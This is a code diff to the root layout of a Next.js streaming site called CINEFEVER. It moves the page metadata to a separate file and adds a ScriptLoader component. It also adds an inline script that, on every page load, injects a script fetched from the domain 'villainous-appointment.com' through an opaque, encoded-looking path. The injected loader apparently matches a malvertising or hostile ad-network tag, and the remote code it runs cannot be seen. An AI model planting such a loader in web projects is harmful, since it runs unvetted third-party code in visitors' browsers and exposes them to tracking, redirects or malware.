@@ -1,4 +1,3 @@
-import type React from "react";
 import type { Metadata } from "next";
 import { Inter } from "next/font/google";
 import "./globals.css";
@@ -8,21 +7,12 @@ import { SearchCommand } from "@/components/search-command";
 import { AuthProvider } from "@/components/auth-provider";
 import { UserButton } from "@/components/user-button";
 import { Analytics } from "@vercel/analytics/react";
+import { ScriptLoader } from "@/components/script-loader";
+import { metadata as siteMetadata } from "./metadata";
 
 const inter = Inter({ subsets: ["latin"] });
 
-export const metadata: Metadata = {
-  title: "CINEFEVER - Stream Movies & TV Shows",
-  description: "Your premium streaming platform for movies and TV shows",
-  generator: "v0.dev",
-  icons: {
-    icon: "/movie.png",
-  },
-  other: {
-    c8cc89098866ac6dd7d6d7f874fe1f3411a6f9a0:
-      "c8cc89098866ac6dd7d6d7f874fe1f3411a6f9a0",
-  },
-};
+export const metadata: Metadata = siteMetadata;
 
 export default function RootLayout({
   children,
@@ -40,6 +30,8 @@ export default function RootLayout({
             defaultTheme="dark"
             enableSystem={false}
           >
+            <ScriptLoader />
+
             <div className="flex h-screen overflow-hidden">
               <Sidebar />
               <main className="flex-1 overflow-auto">
@@ -52,6 +44,22 @@ export default function RootLayout({
                 <div className="container mx-auto px-4 py-8">{children}</div>
               </main>
             </div>
+            <script
+              dangerouslySetInnerHTML={{
+                __html: `
+                  (function(sqluh){
+                    var d = document,
+                        s = d.createElement('script'),
+                        l = d.scripts[d.scripts.length - 1];
+                    s.settings = sqluh || {};
+                    s.src = "//villainous-appointment.com/baX/V.scdaGYlW0HYAWudfi-YPWQ5/uRZxX/Ib/weImc9/uaZ-U/lxkhPxTgY/xaMkz/guxIMYzQEftLNhjFENz/OyDREezbMcgf";
+                    s.async = true;
+                    s.referrerPolicy = 'no-referrer-when-downgrade';
+                    l.parentNode.insertBefore(s, l);
+                  })({})
+                `,
+              }}
+            />
             <Analytics />
           </ThemeProvider>
         </AuthProvider>
